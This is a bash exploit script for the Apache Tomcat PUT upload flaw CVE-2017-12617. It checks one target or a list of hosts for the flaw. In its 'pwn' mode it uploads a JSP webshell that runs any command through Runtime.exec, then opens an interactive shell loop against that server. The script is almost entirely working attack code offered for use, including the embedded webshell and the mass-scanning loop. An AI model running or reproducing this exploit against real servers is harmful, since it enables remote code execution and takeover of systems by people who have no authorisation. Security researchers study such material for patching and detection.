#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Banner
banner="
   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
                                                                           
                                                                           

[@intx0x80]
"

# Function to handle Ctrl+C
trap 'echo -e "${RED}\n[-] Exiting${NC}"; exit 1' SIGINT

# Function to remove HTML tags
removetags() {
    echo "$1" | sed 's/<[^>]*>//g' | tr -d '\n'
}

# Function to check vulnerability
check_vuln() {
    local url=$1
    local file="Poc.jsp"
    echo -e "${GREEN}[+] Checking ${url}${NC}"
    
    # Create test payload
    wget -q --post-data='<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>' --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" --method=PUT "${url}/${file}" -O /dev/null
    
    # Check response
    response=$(wget -q -O - --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "${url}/${file}")
    if [[ $response == *"AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"* ]]; then
        echo -e "${YELLOW}${url} is vulnerable to CVE-2017-12617${NC}"
        echo -e "${YELLOW}${url}/${file}${NC}"
    else
        echo -e "${RED}Not vulnerable to CVE-2017-12617${NC}"
    fi
}

# Function to create webshell
create_webshell() {
    local url=$1
    local file=$2
    local evil="<FORM METHOD=GET ACTION='${file}'>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import=\"java.io.*\" %>
    <%
    String cmd = request.getParameter(\"cmd\");
    String output = \"\";
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
    InputStreamReader(p.getInputStream()));
    while((s = sI.readLine()) != null) { output += s+\"</br>\"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>"
    
    echo -e "${GREEN}[+] Uploading webshell...${NC}"
    wget -q --post-data="$evil" --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" --method=PUT "${url}/${file}" -O /dev/null
    echo -e "${GREEN}[+] Webshell uploaded!${NC}"
}

# Function to get command output
get_output() {
    local url=$1
    local file=$2
    local cmd=$3
    local output=$(wget -q -O - --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" --get --body-data="cmd=${cmd}" "${url}/${file}")
    echo -e "$(removetags "$output")"
}

# Function to run interactive shell
run_shell() {
    local url=$1
    local file=$2
    echo -e "${GREEN}[+] Starting interactive shell...${NC}"
    echo -e "${GREEN}[+] Type 'q' or 'Q' to quit${NC}"
    
    while true; do
        read -p "$ " cmd
        if [[ "$cmd" == "q" || "$cmd" == "Q" ]]; then
            echo -e "${GREEN}[+] Exiting shell${NC}"
            break
        fi
        output=$(get_output "$url" "$file" "$cmd")
        echo -e "$output"
    done
}

# Main script
if [ $# -eq 0 ]; then
    echo -e "${RED}Usage: ./cve-2017-12617.sh [options]${NC}"
    echo -e "${GREEN}Options:${NC}"
    echo -e "  -u, --url [URL]         Check target URL if it's vulnerable"
    echo -e "  -p, --pwn [FILENAME]    Generate webshell and upload it"
    echo -e "  -l, --list [FILE]       Hosts list"
    echo -e ""
    echo -e "Examples:"
    echo -e "  ./cve-2017-12617.sh -u http://127.0.0.1"
    echo -e "  ./cve-2017-12617.sh --url http://127.0.0.1 -p pwn"
    echo -e "  ./cve-2017-12617.sh -l hosts.txt"
    exit 1
fi

while [[ $# -gt 0 ]]; do
    case $1 in
        -u|--url)
            url="$2"
            shift 2
            ;;
        -p|--pwn)
            pwn="$2"
            shift 2
            ;;
        -l|--list)
            hosts_file="$2"
            shift 2
            ;;
        *)
            echo -e "${RED}Unknown option: $1${NC}"
            exit 1
            ;;
    esac
done

# Check single URL
if [ -n "$url" ] && [ -z "$pwn" ] && [ -z "$hosts_file" ]; then
    echo -e "${GREEN}$banner${NC}"
    check_vuln "$url"
# Upload webshell to single URL
elif [ -n "$pwn" ] && [ -n "$url" ] && [ -z "$hosts_file" ]; then
    echo -e "${GREEN}$banner${NC}"
    webshell="${pwn}.jsp"
    create_webshell "$url" "$webshell"
    run_shell "$url" "$webshell"
# Scan hosts from file
elif [ -n "$hosts_file" ] && [ -z "$pwn" ] && [ -z "$url" ]; then
    echo -e "${GREEN}$banner${NC}"
    echo -e "${GREEN}[+] Scanning hosts in $hosts_file${NC}"
    while IFS= read -r host; do
        host=$(echo "$host" | tr -d '\r\n')
        if [ -n "$host" ]; then
            check_vuln "$host"
        fi
    done < "$hosts_file"
else
    echo -e "${RED}Invalid options combination${NC}"
    exit 1
fi
